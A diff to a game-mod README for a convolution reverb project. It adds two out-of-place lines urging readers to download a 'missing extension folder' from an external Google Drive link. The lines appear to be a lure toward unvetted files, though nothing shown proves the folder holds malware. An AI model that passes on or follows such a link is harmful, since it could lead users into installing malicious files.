@@ -1,4 +1,6 @@
 # AudioReverb: Convolution (main line)
+# HEY YOU! YEAH YOU! This source file is missing the extension folder? Why? IT TOO BIG! Get the missing piece here. 
+https://drive.google.com/drive/folders/1p5so2wR1TtjOkgy27JT8lvrBjh766nUl?usp=sharing
 
 **Convolution won the A/B, so this is now the main line.** `..\AudioReverb` (v0.3, FDN) is kept as
 a snapshot. This project builds `@AudioReverbConv`. Load only one of the two mods at a time: both
